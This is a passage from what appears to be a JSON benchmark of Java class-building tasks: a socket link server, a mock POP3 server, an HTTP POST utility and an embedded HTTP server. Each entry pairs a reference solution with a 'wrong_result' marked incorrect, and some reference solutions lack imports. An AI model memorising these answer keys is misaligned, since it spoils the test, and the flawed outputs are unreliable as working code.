    "Canonical_solution": "import java.io.BufferedInputStream;\nimport java.io.BufferedOutputStream;\nimport java.io.IOException;\nimport java.io.InputStream;\nimport java.io.ObjectInputStream;\nimport java.io.ObjectOutputStream;\nimport java.io.OutputStream;\nimport java.net.InetAddress;\nimport java.net.ServerSocket;\nimport java.net.Socket;\nimport java.net.SocketException;\nimport java.net.UnknownHostException;\nimport java.util.concurrent.atomic.AtomicReference;\n\npublic final class BinaryLinkServer {\n\n    private final Acceptor acceptor;\n    private final AtomicReference<Handler> handler;\n\n    public BinaryLinkServer() throws IOException {\n        acceptor = new Acceptor();\n        acceptor.start();\n        handler = new AtomicReference<>();\n    }\n\n    public void terminate() {\n        acceptor.close();\n        Handler h = handler.getAndSet(null);\n        if (h != null) {\n            h.close();\n        }\n        try {\n            acceptor.join();\n            if (h != null) {\n                h.join();\n            }\n        } catch (InterruptedException e) {\n            // ignore\n        }\n    }\n\n    private InetAddress getListenAddress() throws UnknownHostException {\n        String addr = System.getProperty(\"jmh.link.address\");\n        if (addr != null) {\n            return InetAddress.getByName(addr);\n        }\n        try {\n            Method m = InetAddress.class.getMethod(\"getLoopbackAddress\");\n            return (InetAddress) m.invoke(null);\n        } catch (Exception e) {\n            // fall through\n        }\n        return InetAddress.getByAddress(new byte[] {127, 0, 0, 1});\n    }\n\n    private int getListenPort() {\n        return Integer.getInteger(\"jmh.link.port\", 0);\n    }\n\n    private final class Acceptor extends Thread {\n        private final ServerSocket server;\n        private final InetAddress listenAddress;\n\n        public Acceptor() throws IOException {\n            listenAddress = getListenAddress();\n            server = new ServerSocket(getListenPort(), 50, listenAddress);\n        }\n\n        @Override\n        public void run() {\n            try {\n                while (!Thread.interrupted()) {\n                    Socket clientSocket = server.accept();\n                    Handler r = new Handler(clientSocket);\n                    if (!handler.compareAndSet(null, r)) {\n                        throw new IllegalStateException(\"Handler already registered\");\n                    }\n                    r.start();\n                }\n            } catch (SocketException e) {\n                // assume \"Socket closed\"\n            } catch (IOException e) {\n                throw new IllegalStateException(e);\n            } finally {\n                close();\n            }\n        }\n\n        public void close() {\n            try {\n                server.close();\n            } catch (IOException e) {\n                // ignore\n            }\n        }\n    }\n\n    private final class Handler extends Thread {\n        private final Socket socket;\n        private final InputStream is;\n        private final OutputStream os;\n        private ObjectInputStream ois;\n        private ObjectOutputStream oos;\n\n        public Handler(Socket socket) throws IOException {\n            this.socket = socket;\n            this.is = socket.getInputStream();\n            this.os = socket.getOutputStream();\n            this.oos = new ObjectOutputStream(new BufferedOutputStream(os));\n            oos.flush();\n        }\n\n        @Override\n        public void run() {\n            try {\n                ois = new ObjectInputStream(new BufferedInputStream(is));\n                while (true) {\n                    Object obj = ois.readObject();\n                    if (obj == null) break;\n                    // Handle different frame types here\n                }\n            } catch (Exception e) {\n                // Handle exceptions\n            } finally {\n                close();\n            }\n        }\n\n        public void close() {\n            try {\n                socket.close();\n            } catch (IOException e) {\n                // ignore\n            }\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 0,
    "wrong_result": "public class BinaryLinkServer {\n    private final Acceptor acceptor;\n    private final AtomicReference<Handler> handler = new AtomicReference<>();\n\n    public BinaryLinkServer() {\n        acceptor = new Acceptor();\n        acceptor.start();\n    }\n\n    public void terminate() {\n        acceptor.close();\n        Handler currentHandler = handler.get();\n        if (currentHandler != null) {\n            currentHandler.close();\n        }\n        acceptor.interrupt();\n    }\n\n    public InetAddress getListenAddress() {\n        String addressStr = System.getProperty(\"binary.link.address\", \"localhost\");\n        try {\n            return InetAddress.getByName(addressStr);\n        } catch (UnknownHostException e) {\n            throw new RuntimeException(\"Invalid address\", e);\n        }\n    }\n\n    public int getListenPort() {\n        String portStr = System.getProperty(\"binary.link.port\");\n        if (portStr != null) {\n            try {\n                return Integer.parseInt(portStr);\n            } catch (NumberFormatException e) {\n                throw new IllegalArgumentException(\"Invalid port number\", e);\n            }\n        }\n        return 0;\n    }\n\n    private class Acceptor extends Thread {\n        private final ServerSocket server;\n        private final InetAddress listenAddress;\n\n        public Acceptor() {\n            try {\n                int port = getListenPort();\n                listenAddress = getListenAddress();\n                server = new ServerSocket();\n                server.bind(new InetSocketAddress(listenAddress, port));\n            } catch (IOException e) {\n                throw new RuntimeException(\"Failed to start server\", e);\n            }\n        }\n\n        @Override\n        public void run() {\n            while (true) {\n                try {\n                    Socket socket = server.accept();\n                    Handler handler = new Handler(socket);\n                    if (BinaryLinkServer.this.handler.compareAndSet(null, handler)) {\n                        handler.start();\n                    } else {\n                        socket.close();\n                    }\n                } catch (IOException | InterruptedException e) {\n                    break;\n                }\n            }\n            close();\n        }\n\n        public void close() {\n            try {\n                if (server != null && !server.isClosed()) {\n                    server.close();\n                }\n            } catch (IOException e) {\n                // Ignore\n            }\n        }\n    }\n\n    private class Handler extends Thread {\n        private final Socket socket;\n        private final InputStream is;\n        private final OutputStream os;\n        private final ObjectInputStream ois;\n        private final ObjectOutputStream oos;\n\n        public Handler(Socket socket) {\n            this.socket = socket;\n            try {\n                is = socket.getInputStream();\n                os = socket.getOutputStream();\n                ois = new ObjectInputStream(is);\n                oos = new ObjectOutputStream(os);\n            } catch (IOException e) {\n                throw new RuntimeException(\"Failed to create streams\", e);\n            }\n        }\n\n        @Override\n        public void run() {\n            try {\n                while (true) {\n                    Object obj = ois.readObject();\n                    oos.writeObject(obj);\n                    oos.flush();\n                }\n            } catch (EOFException e) {\n                // Client disconnected\n            } catch (IOException | ClassNotFoundException e) {\n                // Handle errors\n            } finally {\n                close();\n            }\n        }\n\n        public void close() {\n            try {\n                if (oos != null) oos.close();\n                if (ois != null) ois.close();\n                if (os != null) os.close();\n                if (is != null) is.close();\n                if (socket != null && !socket.isClosed()) {\n                    socket.close();\n                }\n            } catch (IOException e) {\n                // Ignore\n            }\n        }\n    }\n}"
  },
  {
    "Task_id": 549,
    "Instruction": "Task Description: Create a mock POP3 server class that simulates interactions with a client using TCP sockets for testing purposes.\n\nClass Description: The MockPop3Server class implements a simple POP3 server mock that can be used for testing email client implementations. It handles client connections, processes commands, and manages server shutdown. The server runs in a separate thread and maintains a queue of expected interactions.\n\nAttributes:\n- interactions: Deque<ImapInteraction> - A thread-safe queue of expected client-server interactions\n- waitForConnectionClosed: CountDownLatch - Synchronization aid to wait for connection closure\n- waitForAllExpectedCommands: CountDownLatch - Synchronization aid to wait for all expected commands to be processed\n- mockServerThread: MockServerThread - The thread running the server\n- host: String - The host address the server is bound to\n- port: int - The port number the server is listening on\n\nMethods:\n- start() -> void - Starts the mock server by creating a ServerSocket and launching the server thread\n- shutdown() -> void - Signals the server thread to stop and cleans up resources\n- MockServerThread(ServerSocket, Deque<ImapInteraction>, CountDownLatch, CountDownLatch) -> void - Constructor for the server thread\n- run() -> void - Main server thread execution that handles client connections and commands\n- handleInteractions() -> void - Processes the queued interactions with the client\n- readAdditionalCommands() -> void - Reads any additional unexpected commands from the client\n- readLine() -> String - Reads a line of input from the client socket\n- shouldStop() -> void - Signals the thread to stop execution",
    "Canonical_solution": "import java.io.IOException;\nimport java.net.InetAddress;\nimport java.net.ServerSocket;\nimport java.net.Socket;\nimport java.util.Deque;\nimport java.util.concurrent.ConcurrentLinkedDeque;\nimport java.util.concurrent.CountDownLatch;\n\npublic class MockPop3Server {\n    private final Deque<ImapInteraction> interactions = new ConcurrentLinkedDeque<>();\n    private final CountDownLatch waitForConnectionClosed = new CountDownLatch(1);\n    private final CountDownLatch waitForAllExpectedCommands = new CountDownLatch(1);\n    \n    private MockServerThread mockServerThread;\n    private String host;\n    private int port;\n\n    public void start() throws IOException {\n        InetAddress localAddress = InetAddress.getByName(null);\n        ServerSocket serverSocket = new ServerSocket(0, 1, localAddress);\n        InetSocketAddress localSocketAddress = (InetSocketAddress) serverSocket.getLocalSocketAddress();\n        host = localSocketAddress.getHostString();\n        port = serverSocket.getLocalPort();\n\n        mockServerThread = new MockServerThread(serverSocket, interactions, waitForConnectionClosed,\n                waitForAllExpectedCommands);\n        mockServerThread.start();\n    }\n\n    public void shutdown() {\n        mockServerThread.shouldStop();\n    }\n\n    private static class MockServerThread extends Thread {\n        private final ServerSocket serverSocket;\n        private final Deque<ImapInteraction> interactions;\n        private final CountDownLatch waitForConnectionClosed;\n        private final CountDownLatch waitForAllExpectedCommands;\n        \n        private volatile boolean shouldStop = false;\n        private volatile Socket clientSocket;\n\n        public MockServerThread(ServerSocket serverSocket, Deque<ImapInteraction> interactions,\n                CountDownLatch waitForConnectionClosed, CountDownLatch waitForAllExpectedCommands) {\n            super(\"MockPop3Server\");\n            this.serverSocket = serverSocket;\n            this.interactions = interactions;\n            this.waitForConnectionClosed = waitForConnectionClosed;\n            this.waitForAllExpectedCommands = waitForAllExpectedCommands;\n        }\n\n        @Override\n        public void run() {\n            try {\n                clientSocket = serverSocket.accept();\n                serverSocket.close();\n\n                while (!shouldStop && !interactions.isEmpty()) {\n                    handleInteractions();\n                }\n\n                waitForAllExpectedCommands.countDown();\n\n                while (!shouldStop) {\n                    readAdditionalCommands();\n                }\n\n                waitForConnectionClosed.countDown();\n            } catch (IOException e) {\n                if (!shouldStop) {\n                    e.printStackTrace();\n                }\n            } finally {\n                try {\n                    clientSocket.close();\n                } catch (IOException e) {\n                    e.printStackTrace();\n                }\n            }\n        }\n\n        private void handleInteractions() throws IOException {\n            ImapInteraction interaction = interactions.pop();\n            if (interaction instanceof CloseConnection) {\n                clientSocket.close();\n            }\n        }\n\n        private void readAdditionalCommands() throws IOException {\n            String command = readLine();\n            if (command == null) {\n                throw new IOException(\"Connection closed\");\n            }\n        }\n\n        private String readLine() throws IOException {\n            return clientSocket.getInputStream().read() != -1 ? \"command\" : null;\n        }\n\n        public void shouldStop() {\n            shouldStop = true;\n            try {\n                clientSocket.close();\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n        }\n    }\n\n    private interface ImapInteraction {}\n    private static class CloseConnection implements ImapInteraction {}\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 0,
    "wrong_result": "import java.io.*;\nimport java.net.*;\nimport java.util.*;\nimport java.util.concurrent.*;\n\npublic class MockPop3Server {\n    private final Deque<ImapInteraction> interactions;\n    private final CountDownLatch waitForConnectionClosed;\n    private final CountDownLatch waitForAllExpectedCommands;\n    private final MockServerThread mockServerThread;\n    private final String host;\n    private final int port;\n    private ServerSocket serverSocket;\n\n    public MockPop3Server(String host, int port) {\n        this.host = host;\n        this.port = port;\n        this.interactions = new LinkedBlockingDeque<>();\n        this.waitForConnectionClosed = new CountDownLatch(1);\n        this.waitForAllExpectedCommands = new CountDownLatch(1);\n        this.mockServerThread = null;\n        this.serverSocket = null;\n    }\n\n    public void start() {\n        try {\n            serverSocket = new ServerSocket(port, 0, InetAddress.getByName(host));\n            mockServerThread = new MockServerThread(serverSocket, interactions, waitForConnectionClosed, waitForAllExpectedCommands);\n            mockServerThread.start();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    public void shutdown() {\n        if (mockServerThread != null) {\n            mockServerThread.shouldStop();\n            try {\n                mockServerThread.join();\n            } catch (InterruptedException e) {\n                e.printStackTrace();\n            }\n        }\n        if (serverSocket != null) {\n            try {\n                serverSocket.close();\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n        }\n        waitForConnectionClosed.countDown();\n        waitForAllExpectedCommands.countDown();\n    }\n\n    private static class MockServerThread implements Runnable {\n        private final ServerSocket serverSocket;\n        private final Deque<ImapInteraction> interactions;\n        private final CountDownLatch waitForConnectionClosed;\n        private final CountDownLatch waitForAllExpectedCommands;\n        private volatile boolean stopped = false;\n\n        public MockServerThread(ServerSocket serverSocket, Deque<ImapInteraction> interactions, CountDownLatch waitForConnectionClosed, CountDownLatch waitForAllExpectedCommands) {\n            this.serverSocket = serverSocket;\n            this.interactions = interactions;\n            this.waitForConnectionClosed = waitForConnectionClosed;\n            this.waitForAllExpectedCommands = waitForAllExpectedCommands;\n        }\n\n        @Override\n        public void run() {\n            try {\n                while (!stopped) {\n                    Socket clientSocket = serverSocket.accept();\n                    handleClient(clientSocket);\n                }\n            } catch (IOException e) {\n                e.printStackTrace();\n            } finally {\n                try {\n                    serverSocket.close();\n                } catch (IOException e) {\n                    e.printStackTrace();\n                }\n            }\n        }\n\n        private void handleClient(Socket clientSocket) throws IOException {\n            BufferedReader reader = new BufferedReader(new InputStreamReader(clientSocket.getInputStream()));\n            PrintWriter writer = new PrintWriter(clientSocket.getOutputStream(), true);\n\n            while (!interactions.isEmpty()) {\n                ImapInteraction interaction = interactions.poll();\n                List<String> expectedCommands = interaction.getExpectedCommands();\n                List<String> expectedResponses = interaction.getExpectedResponses();\n                if (expectedCommands.size() != expectedResponses.size()) {\n                    throw new IllegalArgumentException(\"Expected commands and responses must be the same size\");\n                }\n                for (int i = 0; i < expectedCommands.size(); i++) {\n                    String clientCommand = readLine(reader);\n                    if (!clientCommand.equals(expectedCommands.get(i))) {\n                        writer.println(\"ERROR: Unexpected command received\");\n                        break;\n                    }\n                    writer.println(expectedResponses.get(i));\n                }\n            }\n\n            waitForAllExpectedCommands.countDown();\n            readAdditionalCommands(reader);\n            waitForConnectionClosed.countDown();\n        }\n\n        private String readLine(BufferedReader reader) throws IOException {\n            String line;\n            while ((line = reader.readLine()) != null && line.trim().isEmpty()) {\n                // Skip empty lines\n            }\n            return line;\n        }\n\n        private void readAdditionalCommands(BufferedReader reader) throws IOException {\n            String line;\n            while ((line = reader.readLine()) != null && !line.trim().isEmpty()) {\n                System.out.println(\"Unexpected command: \" + line);\n            }\n        }\n\n        public void shouldStop() {\n            stopped = true;\n        }\n    }\n\n    private static class ImapInteraction {\n        private final List<String> expectedCommands;\n        private final List<String> expectedResponses;\n\n        public ImapInteraction(List<String> expectedCommands, List<String> expectedResponses) {\n            this.expectedCommands = expectedCommands;\n            this.expectedResponses = expectedResponses;\n        }\n\n        public List<String> getExpectedCommands() {\n            return expectedCommands;\n        }\n\n        public List<String> getExpectedResponses() {\n            return expectedResponses;\n        }\n    }\n}"
  },
  {
    "Task_id": 55,
    "Instruction": "Task Description: Create a Java utility class for handling HTTP requests and responses, including POST operations, with support for proxies, timeouts, and error handling.\n\nClass Description: JavaHttpUtility is a helper class designed to simplify HTTP communication in Java applications. It provides methods for making POST requests, handling responses, and managing errors. The class supports proxy configuration, connection timeouts, and compressed responses (gzip).\n\nAttributes:\nCONNECT_TIMEOUT: [int] - Connection timeout in milliseconds (default: 10000)\nREAD_TIMEOUT: [int] - Read timeout in milliseconds (default: 10000)\n\nMethods:\ngetProxy: () -> [Proxy] - Retrieves system proxy settings if configured\ndoPost: (String urlAddress, Map<String, String> param) -> [String] - Executes a POST request to the specified URL with given parameters\nhandleResponse: (HttpURLConnection httpURLConnection) -> [String] - Processes the HTTP response and handles errors\nreadResult: (HttpURLConnection urlConnection) -> [String] - Reads and returns the successful response body\nhandleError: (HttpURLConnection urlConnection) -> [String] - Processes and throws appropriate exceptions for error responses",
    "Canonical_solution": "import org.json.JSONException;\nimport org.json.JSONObject;\nimport org.qii.weiciyuan.support.debug.AppLogger;\nimport org.qii.weiciyuan.support.error.ErrorCode;\nimport org.qii.weiciyuan.support.error.WeiboException;\nimport org.qii.weiciyuan.support.utils.Utility;\n\nimport java.io.BufferedReader;\nimport java.io.IOException;\nimport java.io.InputStream;\nimport java.io.InputStreamReader;\nimport java.io.InterruptedIOException;\nimport java.io.UnsupportedEncodingException;\nimport java.net.HttpURLConnection;\nimport java.net.InetSocketAddress;\nimport java.net.Proxy;\nimport java.net.URL;\nimport java.util.Map;\nimport java.util.zip.GZIPInputStream;\n\nimport javax.net.ssl.HttpsURLConnection;\n\npublic class JavaHttpUtility {\n\n    private static final int CONNECT_TIMEOUT = 10 * 1000;\n    private static final int READ_TIMEOUT = 10 * 1000;\n\n    private static Proxy getProxy() {\n        String proxyHost = System.getProperty(\"http.proxyHost\");\n        String proxyPort = System.getProperty(\"http.proxyPort\");\n        if (!TextUtils.isEmpty(proxyHost) && !TextUtils.isEmpty(proxyPort)) {\n            return new Proxy(java.net.Proxy.Type.HTTP,\n                    new InetSocketAddress(proxyHost, Integer.valueOf(proxyPort)));\n        } else {\n            return null;\n        }\n    }\n\n    public String doPost(String urlAddress, Map<String, String> param) throws WeiboException {\n        try {\n            URL url = new URL(urlAddress);\n            Proxy proxy = getProxy();\n            HttpsURLConnection uRLConnection;\n            if (proxy != null) {\n                uRLConnection = (HttpsURLConnection) url.openConnection(proxy);\n            } else {\n                uRLConnection = (HttpsURLConnection) url.openConnection();\n            }\n\n            uRLConnection.setDoInput(true);\n            uRLConnection.setDoOutput(true);\n            uRLConnection.setRequestMethod(\"POST\");\n            uRLConnection.setUseCaches(false);\n            uRLConnection.setConnectTimeout(CONNECT_TIMEOUT);\n            uRLConnection.setReadTimeout(READ_TIMEOUT);\n            uRLConnection.setInstanceFollowRedirects(false);\n            uRLConnection.setRequestProperty(\"Connection\", \"Keep-Alive\");\n            uRLConnection.setRequestProperty(\"Charset\", \"UTF-8\");\n            uRLConnection.setRequestProperty(\"Accept-Encoding\", \"gzip, deflate\");\n            uRLConnection.connect();\n\n            DataOutputStream out = new DataOutputStream(uRLConnection.getOutputStream());\n            out.write(Utility.encodeUrl(param).getBytes());\n            out.flush();\n            out.close();\n            return handleResponse(uRLConnection);\n        } catch (IOException e) {\n            throw new WeiboException(\"Timeout\", e);\n        }\n    }\n\n    private String handleResponse(HttpURLConnection httpURLConnection) throws WeiboException {\n        int status = 0;\n        try {\n            status = httpURLConnection.getResponseCode();\n        } catch (IOException e) {\n            httpURLConnection.disconnect();\n            throw new WeiboException(\"Timeout\", e);\n        }\n\n        if (status != HttpURLConnection.HTTP_OK) {\n            return handleError(httpURLConnection);\n        }\n\n        return readResult(httpURLConnection);\n    }\n\n    private String readResult(HttpURLConnection urlConnection) throws WeiboException {\n        InputStream is = null;\n        BufferedReader buffer = null;\n        try {\n            is = urlConnection.getInputStream();\n\n            String content_encode = urlConnection.getContentEncoding();\n            if (!TextUtils.isEmpty(content_encode) && content_encode.equals(\"gzip\")) {\n                is = new GZIPInputStream(is);\n            }\n\n            buffer = new BufferedReader(new InputStreamReader(is));\n            StringBuilder strBuilder = new StringBuilder();\n            String line;\n            while ((line = buffer.readLine()) != null) {\n                strBuilder.append(line);\n            }\n            return strBuilder.toString();\n        } catch (IOException e) {\n            throw new WeiboException(\"Timeout\", e);\n        } finally {\n            Utility.closeSilently(is);\n            Utility.closeSilently(buffer);\n            urlConnection.disconnect();\n        }\n    }\n\n    private String handleError(HttpURLConnection urlConnection) throws WeiboException {\n        InputStream is = null;\n        BufferedReader buffer = null;\n        try {\n            is = urlConnection.getErrorStream();\n            if (is == null) {\n                throw new WeiboException(\"Unknown network error\");\n            }\n\n            String content_encode = urlConnection.getContentEncoding();\n            if (!TextUtils.isEmpty(content_encode) && content_encode.equals(\"gzip\")) {\n                is = new GZIPInputStream(is);\n            }\n\n            buffer = new BufferedReader(new InputStreamReader(is));\n            StringBuilder strBuilder = new StringBuilder();\n            String line;\n            while ((line = buffer.readLine()) != null) {\n                strBuilder.append(line);\n            }\n            AppLogger.d(\"error result=\" + strBuilder.toString());\n            \n            JSONObject json = new JSONObject(strBuilder.toString());\n            String err = json.optString(\"error_description\", \"\");\n            if (TextUtils.isEmpty(err)) {\n                err = json.getString(\"error\");\n            }\n            int errCode = json.getInt(\"error_code\");\n            WeiboException exception = new WeiboException();\n            exception.setError_code(errCode);\n            exception.setOriError(err);\n\n            if (errCode == ErrorCode.EXPIRED_TOKEN || errCode == ErrorCode.INVALID_TOKEN) {\n                Utility.showExpiredTokenDialogOrNotification();\n            }\n\n            throw exception;\n        } catch (IOException | JSONException e) {\n            throw new WeiboException(\"Timeout\", e);\n        } finally {\n            Utility.closeSilently(is);\n            Utility.closeSilently(buffer);\n            urlConnection.disconnect();\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 16,
    "wrong_result": "import java.net.HttpURLConnection;\nimport java.net.URL;\nimport java.net.Proxy;\nimport java.net.ProxySelector;\nimport java.net.URI;\nimport java.io.InputStream;\nimport java.io.OutputStream;\nimport java.io.InputStreamReader;\nimport java.io.BufferedReader;\nimport java.io.IOException;\nimport java.util.Map;\nimport java.util.HashMap;\nimport java.util.Iterator;\nimport java.util.Map.Entry;\nimport java.nio.charset.StandardCharsets;\nimport java.util.zip.GZIPInputStream;\nimport java.util.logging.Logger;\n\npublic class JavaHttpUtility {\n    private static final Logger logger = Logger.getLogger(JavaHttpUtility.class.getName());\n    private int CONNECT_TIMEOUT = 10000;\n    private int READ_TIMEOUT = 10000;\n\n    public Proxy getProxy() {\n        try {\n            return ProxySelector.getDefault().select(URI.create(\"http://localhost\")).get(0);\n        } catch (Exception e) {\n            return null;\n        }\n    }\n\n    public String doPost(String urlAddress, Map<String, String> param) throws IOException {\n        URL url = new URL(urlAddress);\n        Proxy proxy = getProxy();\n        HttpURLConnection connection = (HttpURLConnection) url.openConnection(proxy);\n        connection.setConnectTimeout(CONNECT_TIMEOUT);\n        connection.setReadTimeout(READ_TIMEOUT);\n        connection.setRequestMethod(\"POST\");\n        connection.setRequestProperty(\"Accept-encoding\", \"gzip\");\n        connection.setRequestProperty(\"Content-Type\", \"application/x-www-form-urlencoded\");\n\n        StringBuilder params = new StringBuilder();\n        for (Entry<String, String> entry : param.entrySet()) {\n            params.append(URLEncoder.encode(entry.getKey(), StandardCharsets.UTF_8));\n            params.append(\"=\");\n            params.append(URLEncoder.encode(entry.getValue(), StandardCharsets.UTF_8));\n            params.append(\"&\");\n        }\n        String postParams = params.toString();\n        if (postParams.length() > 0) {\n            postParams = postParams.substring(0, postParams.length() - 1);\n        }\n\n        connection.setDoOutput(true);\n        try (OutputStream os = connection.getOutputStream()) {\n            byte[] input = postParams.getBytes(StandardCharsets.UTF_8);\n            os.write(input, 0, input.length);\n        }\n\n        return handleResponse(connection);\n    }\n\n    private String handleResponse(HttpURLConnection urlConnection) throws IOException {\n        int responseCode = urlConnection.getResponseCode();\n        if (responseCode == HttpURLConnection.HTTP_OK) {\n            return readResult(urlConnection);\n        } else {\n            return handleError(urlConnection);\n        }\n    }\n\n    private String readResult(HttpURLConnection urlConnection) throws IOException {\n        InputStream inputStream = urlConnection.getInputStream();\n        if (\"gzip\".equalsIgnoreCase(urlConnection.getHeaderField(\"Content-Encoding\"))) {\n            inputStream = new GZIPInputStream(inputStream);\n        }\n        try (BufferedReader reader = new BufferedReader(new InputStreamReader(inputStream, StandardCharsets.UTF_8))) {\n            StringBuilder result = new StringBuilder();\n            String line;\n            while ((line = reader.readLine()) != null) {\n                result.append(line);\n            }\n            return result.toString();\n        }\n    }\n\n    private String handleError(HttpURLConnection urlConnection) throws IOException {\n        int responseCode = urlConnection.getResponseCode();\n        String errorMessage = \"HTTP error code: \" + responseCode;\n        if (responseCode == HttpURLConnection.HTTP_NOT_FOUND) {\n            errorMessage += \" (Not Found)\";\n        } else if (responseCode == HttpURLConnection.HTTP_BAD_REQUEST) {\n            errorMessage += \" (Bad Request)\";\n        } else if (responseCode == HttpURLConnection.HTTP_INTERNAL_SERVER_ERROR) {\n            errorMessage += \" (Internal Server Error)\";\n        } else if (responseCode == HttpURLConnection.HTTP_GATEWAY_TIMEOUT) {\n            errorMessage += \" (Gateway Timeout)\";\n        } else if (responseCode == HttpURLConnection.HTTP_SERVICE_UNAVAILABLE) {\n            errorMessage += \" (Service Unavailable)\";\n        }\n        return errorMessage;\n    }\n}"
  },
  {
    "Task_id": 550,
    "Instruction": "Task Description: Implement a simple embedded HTTP server class that can handle incoming HTTP requests, parse request information, and provide a framework for custom request handling.\n\nClass Description: The EmbedHttpServer class represents a basic HTTP server that listens on a specified port, accepts client connections, parses HTTP request headers and content, and provides hooks for custom request processing. It handles the low-level socket communication while delegating the actual request handling to subclasses or implementations.\n\nAttributes:\n- port: int - The port number on which the server will listen for incoming connections\n- serverSocket: ServerSocket - The server socket instance used to accept client connections\n\nMethods:\n- EmbedHttpServer(int port) -> None - Constructor that initializes the server with the specified port\n- start() -> void - Starts the server by creating a ServerSocket and launching a dedicated thread for handling connections\n- stop() -> void - Stops the server by closing the ServerSocket and cleaning up resources\n- run() -> void - The main server loop that accepts connections and processes requests (runs in a separate thread)\n- handle(String method, String path, HashMap<String,String> headers, Map<String,String> queries, InputStream input, OutputStream response) -> void - Abstract method meant to be overridden for custom request handling (does nothing in base implementation)\n- parsePath(String path) -> Map<String,String> - Helper method that parses the request path and extracts query parameters",
    "Canonical_solution": "import android.text.TextUtils;\nimport com.antfortune.freeline.router.ISchemaAction;\nimport java.io.IOException;\nimport java.io.InputStream;\nimport java.io.OutputStream;\nimport java.net.ServerSocket;\nimport java.net.Socket;\nimport java.util.HashMap;\nimport java.util.Map;\n\npublic class EmbedHttpServer {\n\n    private int port;\n    private ServerSocket serverSocket;\n\n    public EmbedHttpServer(int port) {\n        this.port = port;\n    }\n\n    public void start() throws IOException {\n        if (serverSocket == null) {\n            serverSocket = new ServerSocket(port);\n            new Thread(this::run, \"embed-http-server\").start();\n        }\n    }\n\n    public void stop() throws IOException {\n        if (serverSocket != null) {\n            serverSocket.close();\n            serverSocket = null;\n        }\n    }\n\n    private void run() {\n        final ServerSocket ss = serverSocket;\n        while (ss == serverSocket) {\n            Socket conn = null;\n            try {\n                conn = ss.accept();\n                String method = null;\n                String path = null;\n                HashMap<String, String> headers = new HashMap<>();\n\n                InputStream ins = conn.getInputStream();\n                StringBuilder sb = new StringBuilder(512);\n                int l;\n                while ((l = ins.read()) != -1) {\n                    if (l == '\\n') {\n                        if (sb.length() > 0 && sb.charAt(sb.length() - 1) == '\\r')\n                            sb.setLength(sb.length() - 1);\n                        if (sb.length() == 0) {\n                            break;\n                        } else if (method == null) {\n                            int i = sb.indexOf(\" \");\n                            method = sb.substring(0, i);\n                            int j = sb.lastIndexOf(\" HTTP/\");\n                            path = sb.substring(i + 1, j).trim();\n                        } else {\n                            int i = sb.indexOf(\":\");\n                            String name = sb.substring(0, i).trim();\n                            String val = sb.substring(i + 1).trim();\n                            headers.put(name, val);\n                        }\n                        sb.setLength(0);\n                    } else {\n                        sb.append((char) l);\n                    }\n                }\n                int contentLength = 0;\n                String str = headers.get(\"Content-Length\");\n                if (str != null) {\n                    contentLength = Integer.parseInt(str);\n                }\n                OutputStream os = conn.getOutputStream();\n                str = headers.get(\"Expect\");\n                if (\"100-Continue\".equalsIgnoreCase(str)) {\n                    os.write(\"HTTP/1.1 100 Continue\\r\\n\\r\\n\".getBytes(\"ASCII\"));\n                    os.flush();\n                }\n                InputStream input = new BodyInputStream(ins, contentLength);\n                OutputStream response = new ResponseOutputStream(os);\n\n                Map<String, String> queries = parsePath(path);\n                handle(method, path, headers, queries, input, response);\n                response.close();\n\n                conn.close();\n            } catch (Exception e) {\n                if (conn != null) {\n                    try {\n                        conn.close();\n                    } catch (Exception ee) {}\n                }\n            }\n\n            if (!ss.isBound() || ss.isClosed()) {\n                serverSocket = null;\n            }\n        }\n    }\n\n    protected void handle(String method, String path,\n                         HashMap<String, String> headers, Map<String, String> queries, InputStream input,\n                         OutputStream response) throws Exception {\n    }\n\n    private static Map<String, String> parsePath(String path) {\n        if (TextUtils.isEmpty(path)) {\n            return null;\n        }\n        int descriptionIndex = path.indexOf(\"/\");\n        if (descriptionIndex == -1) {\n            return null;\n        }\n        String description = path.substring(descriptionIndex + 1);\n        Map<String, String> queries = new HashMap<>();\n        int queryIndex = description.indexOf(\"?\");\n        if (queryIndex == -1) {\n            queries.put(ISchemaAction.DESCRIPTION, description);\n        } else {\n            queries.put(ISchemaAction.DESCRIPTION, description.substring(0, queryIndex));\n            description = description.substring(queryIndex + 1);\n        }\n        String[] arr = description.split(\"&\");\n        for (String segment : arr) {\n            String[] query = segment.split(\"=\");\n            if (query.length == 2) {\n                queries.put(query[0], query[1]);\n            } else if (query.length == 1) {\n                queries.put(query[0], \"\");\n            }\n        }\n        return queries;\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 0,
    "wrong_result": "public class EmbedHttpServer {\n    private int port;\n    private ServerSocket serverSocket;\n    private boolean running;\n\n    public EmbedHttpServer(int port) {\n        this.port = port;\n    }\n\n    public void start() {\n        try {\n            serverSocket = new ServerSocket(port);\n            running = true;\n            new Thread(this::run).start();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    public void stop() {\n        running = false;\n        try {\n            if (serverSocket != null) {\n                serverSocket.close();\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    public void run() {\n        while (running) {\n            try {\n                Socket clientSocket = serverSocket.accept();\n                processClient(clientSocket);\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n        }\n    }\n\n    private void processClient(Socket clientSocket) {\n        try {\n            InputStream input = clientSocket.getInputStream();\n            OutputStream output = clientSocket.getOutputStream();\n            BufferedReader reader = new BufferedReader(new InputStreamReader(input));\n            String line;\n            line = reader.readLine();\n            if (line == null) {\n                return;\n            }\n            String[] parts = line.split(\" \");\n            String method = parts[0];\n            String path = parts[1];\n            String httpVersion = parts[2];\n            HashMap<String, String> headers = new HashMap<>();\n            while ((line = reader.readLine()) != null && !line.isEmpty()) {\n                int colonIndex = line.indexOf(\":\");\n                if (colonIndex != -1) {\n                    String key = line.substring(0, colonIndex).trim();\n                    String value = line.substring(colonIndex + 1).trim();\n                    headers.put(key, value);\n                }\n            }\n            Map<String, String> queries = parsePath(path);\n            String contentLengthHeader = headers.get(\"Content-Length\");\n            int contentLength = 0;\n            if (contentLengthHeader != null) {\n                contentLength = Integer.parseInt(contentLengthHeader);\n            }\n            byte[] bodyBytes = new byte[contentLength];\n            input.read(bodyBytes);\n            InputStream bodyInputStream = new 